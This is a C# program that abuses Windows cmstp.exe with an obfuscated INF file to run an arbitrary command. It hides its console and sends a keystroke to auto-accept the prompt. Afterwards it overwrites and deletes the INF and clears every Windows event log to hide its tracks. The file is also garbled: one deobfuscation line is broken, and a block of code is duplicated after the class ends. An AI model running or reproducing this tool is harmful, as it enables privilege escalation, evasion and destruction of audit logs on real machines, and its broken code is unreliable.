using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

public class Program
{
    // Generate a random hash identifier
    private static string GetRandomHashIdentifier()
    {
        byte[] buffer = new byte[16];
        using (var rng = new RNGCryptoServiceProvider())
        {
            rng.GetBytes(buffer);
        }
        return BitConverter.ToString(buffer).Replace("-", "").ToLower();
    }

    // Obfuscate strings using XOR encryption
    private static string Obfuscate(string input)
    {
        byte[] bytes = Encoding.UTF8.GetBytes(input);
        for (int i = 0; i < bytes.Length; i++)
        {
            bytes[i] ^= 0x55; // XOR with a key
        }
        return Convert.ToBase64String(bytes); // Return Base64 encoded string
    }

    // Deobfuscate using XOR
    private static string Deobfuscate(string input)
    {
        byte[] bytes =);
        for (int i = 0; i < bytes.Length; i++)
        {
            bytes[i] ^= 0x55; // XOR with the same key
        }
        return Encoding.UTF8.GetString(bytes);
    }

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SetForegroundWindow(IntPtr hWnd);
    
    public const string CmstpPath = @"C:\windows\system32\cmstp.exe";

    public static void Main(string[] args)
    {
        if (args.Length < 2)
        {
            Console.WriteLine("Invalid arguments. Usage: Program.exe <command> <obfuscatedInf>");
            return;
        }

        string payloadCommand = args[0];
        string obfuscatedInf = args[1];

        ExecutePayload(payloadCommand, obfuscatedInf);
    }

    public static void ExecutePayload(string command, string obfuscatedInf)
    {
        if (!File.Exists(CmstpPath)) return;

        IntPtr consoleWindow = GetConsoleWindow();
        ShowWindow(consoleWindow, 0); // Hide console window

        // Ensure cmstp.exe is not running
        Process.Start(new ProcessStartInfo("taskkill", "/F /IM cmstp.exe")
        {
            UseShellExecute = false,
            CreateNoWindow = true
        });

        string infFilePath = CreateInfFile(command, obfuscatedInf);
        Console.WriteLine("Obfuscated payload file written to " + infFilePath);

        // Execute cmstp with the obfuscated INF file
        Process.Start(new ProcessStartInfo(CmstpPath, "/au \"" + infFilePath + "\"")
        {
            UseShellExecute = false,
            CreateNoWindow = true
        });

        IntPtr cmstpHandle = IntPtr.Zero;
        while ((cmstpHandle = GetProcessHandle("cmstp")) == IntPtr.Zero) { }

        SendKeys.SendWait("{ENTER}");

        CleanUp(infFilePath);
    }

    public static IntPtr GetProcessHandle(string processName)
    {
        Process[] processes = Process.GetProcessesByName(processName);
        if (processes.Length == 0) return IntPtr.Zero;

        IntPtr handle = processes[0].MainWindowHandle;
        if (handle == IntPtr.Zero) return IntPtr.Zero;

        SetForegroundWindow(handle);
        ShowWindow(handle, 5);
        return handle;
    }

    public static string CreateInfFile(string command, string obfuscatedInf)
    {
        string randomIdentifier = GetRandomHashIdentifier();
        string tempPath = Path.Combine(Path.GetTempPath(), $"{randomIdentifier}.inf");
        
        // Write the obfuscated INF content
        File.WriteAllText(tempPath, Deobfuscate(obfuscatedInf).Replace("REPLACE_COMMAND_LINE", command));
        
        return tempPath;
    }

    public static void CleanUp(string filePath)
    {
        // Create random data for cleanup
        using (var rng = new RNGCryptoServiceProvider())
        {
            byte[] randomData = new byte[1024];
            rng.GetBytes(randomData);
            File.WriteAllBytes(filePath, randomData); // Overwrite the file
        }
        File.Delete(filePath); // Delete the INF file
        ClearEventLogs();
    }

    public static void ClearEventLogs()
    {
        EventLog[] eventLogs = EventLog.GetEventLogs();
        foreach (EventLog eventLog in eventLogs)
        {
            eventLog.Clear();
        }
    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
}

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
}
